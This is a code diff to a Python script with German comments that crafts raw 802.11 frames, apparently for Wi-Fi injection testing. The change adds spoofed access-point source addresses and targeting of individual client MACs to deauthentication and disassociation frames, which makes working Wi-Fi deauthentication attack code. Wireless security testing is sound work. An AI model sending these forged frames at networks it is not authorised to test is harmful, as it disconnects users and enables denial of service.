@@ -12,7 +12,8 @@ KIND  = (sys.argv[3] if len(sys.argv) > 3 else "action").lower()
 COUNT = int(sys.argv[4]) if len(sys.argv) > 4 else 5
 LASTMAC = int(sys.argv[5], 16) if len(sys.argv) > 5 else 0x01
 TARGET_BSSID = bytes.fromhex(sys.argv[6].replace(":","")) if len(sys.argv) > 6 else None
-SSID_ARG = sys.argv[7].encode() if len(sys.argv) > 7 else None
+SSID_ARG = sys.argv[7].encode() if len(sys.argv) > 7 and sys.argv[7] else None
+CLIENT_MAC = bytes.fromhex(sys.argv[8].replace(":","")) if len(sys.argv) > 8 and sys.argv[8] else None
 
 SRC = bytes([0x02, 0x00, 0x00, 0xde, 0xad, LASTMAC])   # lokal verwaltete MAC
 
@@ -27,12 +28,13 @@ def radiotap():
     """version 0, pad 0, len 8, present 0 -> keine Felder, Treiber nimmt Defaults."""
     return struct.pack("<BBHI", 0, 0, 8, 0)
 
-def hdr(fc0, addr1=None, addr3=None):
-    """addr1 = DA (Standard Broadcast), addr3 = BSSID (Standard: SRC)."""
+def hdr(fc0, addr1=None, addr2=None, addr3=None):
+    """addr1 = DA, addr2 = SA, addr3 = BSSID.
+    Standard: DA Broadcast, SA = unsere Test-MAC, BSSID = SA."""
     return (struct.pack("<BB", fc0, 0x00)     # Frame Control
             + struct.pack("<H", 0)            # Duration
             + (addr1 if addr1 else b"\xff" * 6)   # Addr1 DA
-            + SRC                             # Addr2 SA
+            + (addr2 if addr2 else SRC)       # Addr2 SA
             + (addr3 if addr3 else SRC)       # Addr3 BSSID
             + struct.pack("<H", 0))           # Sequence Control
 
@@ -53,15 +55,18 @@ def build(kind):
         ies = bytes([0x00, 0x00]) + bytes([0x01, 0x01, 0x82])
         return hdr(0x40, addr3=BROADCAST) + ies
     if kind == "deauth":
-        # Deauthentifizierung, Grund 7
+        # Deauth: DA = Ziel-Client, SA/BSSID = Access Point (gefälscht)
         b = TARGET_BSSID or BROADCAST
-        return hdr(0xc0, addr1=b, addr3=b) + struct.pack("<H", 7)
+        da = CLIENT_MAC or b
+        return hdr(0xc0, addr1=da, addr2=b, addr3=b) + struct.pack("<H", 7)
     if kind == "auth":
         # Authentication, Open System, Seq 1, Status 0 — an BSSID adressiert
         b = TARGET_BSSID or BROADCAST
         return hdr(0xb0, addr1=b, addr3=b) + struct.pack("<HHH", 0, 1, 0)
     if kind == "disassoc":
-        return hdr(0xa0) + struct.pack("<H", 8)
+        b = TARGET_BSSID or BROADCAST
+        da = CLIENT_MAC or b
+        return hdr(0xa0, addr1=da, addr2=b, addr3=b) + struct.pack("<H", 8)
     # action (0xd0): Category 127 vendor specific + OUI + Typ + Nutzlast
     body = bytes([0x7f]) + b"\xae\xe2\xae" + bytes([0x01]) + b"AICMON-INJECT-PROBE"
     return hdr(0xd0) + body
